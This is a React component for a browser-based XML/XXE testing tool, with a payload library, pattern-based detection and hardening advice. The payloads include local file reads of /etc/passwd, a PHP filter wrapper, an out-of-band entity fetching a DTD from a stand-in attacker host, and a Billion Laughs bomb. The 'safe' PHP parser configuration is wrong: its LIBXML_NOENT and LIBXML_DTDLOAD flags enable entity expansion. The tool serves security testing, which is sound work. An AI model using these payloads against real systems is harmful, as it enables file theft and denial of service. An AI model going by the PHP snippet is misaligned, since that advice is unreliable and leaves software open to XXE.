import React, { useState } from 'react';
import { useStore } from '../../store/store';
import styles from './Tool.module.css';

export default function XXETester() {
  const [xmlInput, setXmlInput] = useState('');
  const [results, setResults] = useState<any>(null);
  const [loading, setLoading] = useState(false);
  const setActiveGalaxyTool = useStore((state) => state.setActiveGalaxyTool);

  const xxePayloads = [
    {
      name: 'Basic XXE (File Read)',
      description: 'Attempts to read /etc/passwd',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
  <data>&xxe;</data>
</root>`,
    },
    {
      name: 'XXE with PHP Wrapper',
      description: 'Uses PHP wrapper to read files as base64',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root>
  <data>&xxe;</data>
</root>`,
    },
    {
      name: 'XXE OOB (Out-of-Band)',
      description: 'Sends data to external server',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
<root>
  <data>test</data>
</root>`,
    },
    {
      name: 'Billion Laughs Attack (XXE Bomb)',
      description: 'Resource exhaustion via entity expansion',
      payload: `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<root>&lol4;</root>`,
    },
    {
      name: 'XXE via SOAP',
      description: 'XXE in SOAP envelope',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <foo>&xxe;</foo>
  </soap:Body>
</soap:Envelope>`,
    },
    {
      name: 'XXE via SVG',
      description: 'XXE through SVG file upload',
      payload: `<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="15">&xxe;</text>
</svg>`,
    },
  ];

  const parseXML = () => {
    setLoading(true);
    setResults(null);

    try {
      // Basic XML parsing
      const parser = new DOMParser();
      const xmlDoc = parser.parseFromString(xmlInput, 'text/xml');
      
      const parseError = xmlDoc.querySelector('parsererror');
      if (parseError) {
        throw new Error(parseError.textContent || 'XML parsing error');
      }

      // Analyze XML structure
      const analysis: any = {
        valid: true,
        rootElement: xmlDoc.documentElement.tagName,
        elements: xmlDoc.getElementsByTagName('*').length,
        vulnerabilities: [],
        recommendations: [],
      };

      // Check for XXE patterns
      const xmlString = xmlInput.toLowerCase();
      
      if (xmlString.includes('<!doctype')) {
        analysis.vulnerabilities.push({
          type: 'DOCTYPE Declaration',
          severity: 'High',
          description: 'XML contains DOCTYPE declaration which may allow XXE attacks',
        });
      }

      if (xmlString.includes('<!entity')) {
        analysis.vulnerabilities.push({
          type: 'Entity Declaration',
          severity: 'Critical',
          description: 'XML contains entity declarations - potential XXE vulnerability',
        });
      }

      if (xmlString.includes('system') && xmlString.includes('file://')) {
        analysis.vulnerabilities.push({
          type: 'File Access Attempt',
          severity: 'Critical',
          description: 'XML attempts to access local files via SYSTEM keyword',
        });
      }

      if (xmlString.includes('http://') || xmlString.includes('https://')) {
        analysis.vulnerabilities.push({
          type: 'External Reference',
          severity: 'High',
          description: 'XML references external resources - OOB XXE possible',
        });
      }

      if (xmlString.match(/&\w+;{5,}/)) {
        analysis.vulnerabilities.push({
          type: 'Entity Explosion',
          severity: 'Critical',
          description: 'Multiple entity references detected - possible Billion Laughs attack',
        });
      }

      if (xmlString.includes('php://')) {
        analysis.vulnerabilities.push({
          type: 'PHP Wrapper',
          severity: 'Critical',
          description: 'PHP wrapper detected - may bypass protections',
        });
      }

      // Recommendations
      analysis.recommendations = [
        '✅ Disable external entity processing in XML parser',
        '✅ Validate XML against strict schema (XSD)',
        '✅ Use less complex data formats (JSON) when possible',
        '✅ Implement WAF rules to block XXE patterns',
        '✅ Keep XML libraries up to date',
        '✅ Use safe parser configurations',
      ];

      // Parser configuration examples
      analysis.safeConfigurations = {
        'Java (SAXParser)': `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);`,
        'PHP (libxml)': `libxml_disable_entity_loader(true);
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_DTDATTR);`,
        'Python (lxml)': `from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.fromstring(xml, parser=parser)`,
        '.NET': `XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;`,
      };

      setResults(analysis);
    } catch (error: any) {
      setResults({
        valid: false,
        error: error.message,
        suggestions: [
          'Ensure XML is well-formed',
          'Check for syntax errors',
          'Validate XML structure',
        ],
      });
    } finally {
      setLoading(false);
    }
  };

  const loadPayload = (payload: string) => {
    setXmlInput(payload);
  };

  return (
    <div className={styles.tool}>
      <div className={styles.header}>
        <button className={styles.backButton} onClick={() => setActiveGalaxyTool(null)}>
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor">
            <path d="M19 12H5M12 19l-7-7 7-7" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
        </button>
        <div>
          <h2 className={styles.title}>📄 XML & XXE Tester</h2>
          <p className={styles.description}>Parse XML and detect XXE vulnerabilities</p>
        </div>
      </div>

      <div className={styles.content}>
        <div className={styles.warning}>
          ⚠️ <strong>Warning:</strong> XXE attacks can read sensitive files and perform SSRF. 
          Only test on systems you own.
        </div>

        <div className={styles.section}>
          <label className={styles.label}>XML Input</label>
          <textarea
            className={styles.textarea}
            value={xmlInput}
            onChange={(e) => setXmlInput(e.target.value)}
            placeholder="Paste XML here..."
            rows={14}
          />
          <div className={styles.buttonGroup}>
            <button className={styles.button} onClick={parseXML} disabled={loading}>
              {loading ? 'Analyzing...' : 'Analyze XML'}
            </button>
            <button className={styles.buttonSecondary} onClick={() => setXmlInput('')}>
              Clear
            </button>
          </div>
        </div>

        <div className={styles.section}>
          <h3 className={styles.subtitle}>XXE Payload Library</h3>
          <div className={styles.payloadList}>
            {xxePayloads.map((p, idx) => (
              <div key={idx} className={styles.payloadItem}>
                <div className={styles.payloadHeader}>
                  <strong>{p.name}</strong>
                  <button 
                    className={styles.buttonSmall}
                    onClick={() => loadPayload(p.payload)}
                  >
                    Load
                  </button>
                </div>
                <div className={styles.payloadDescription}>{p.description}</div>
              </div>
            ))}
          </div>
        </div>

        {results && (
          <div className={styles.section}>
            <h3 className={styles.subtitle}>Analysis Results</h3>
            {results.valid ? (
              <div>
                <div className={styles.info}>
                  <strong>Root Element:</strong> {results.rootElement}
                </div>
                <div className={styles.info}>
                  <strong>Total Elements:</strong> {results.elements}
                </div>

                {results.vulnerabilities && results.vulnerabilities.length > 0 && (
                  <>
                    <h4 style={{ marginTop: '1rem', color: '#ff3366' }}>⚠️ Vulnerabilities Detected</h4>
                    {results.vulnerabilities.map((vuln: any, idx: number) => (
                      <div key={idx} className={styles.vulnerability}>
                        <div className={styles.vulnHeader}>
                          <strong>{vuln.type}</strong>
                          <span className={`${styles.badge} ${styles[vuln.severity.toLowerCase()]}`}>
                            {vuln.severity}
                          </span>
                        </div>
                        <div>{vuln.description}</div>
                      </div>
                    ))}
                  </>
                )}

                {results.recommendations && (
                  <>
                    <h4 style={{ marginTop: '1rem' }}>Security Recommendations</h4>
                    <div className={styles.recommendations}>
                      {results.recommendations.map((rec: string, idx: number) => (
                        <div key={idx} className={styles.recommendation}>{rec}</div>
                      ))}
                    </div>
                  </>
                )}

                {results.safeConfigurations && (
                  <>
                    <h4 style={{ marginTop: '1rem' }}>Safe Parser Configurations</h4>
                    {Object.entries(results.safeConfigurations).map(([lang, code]) => (
                      <div key={lang} style={{ marginTop: '0.5rem' }}>
                        <strong>{lang}:</strong>
                        <div className={styles.codeBlock}>
                          <pre>{code as string}</pre>
                        </div>
                      </div>
                    ))}
                  </>
                )}
              </div>
            ) : (
              <div className={styles.errorResult}>
                <h4>❌ Parsing Failed</h4>
                <div className={styles.error}>{results.error}</div>
                {results.suggestions && (
                  <ul>
                    {results.suggestions.map((sug: string, idx: number) => (
                      <li key={idx}>{sug}</li>
                    ))}
                  </ul>
                )}
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
}
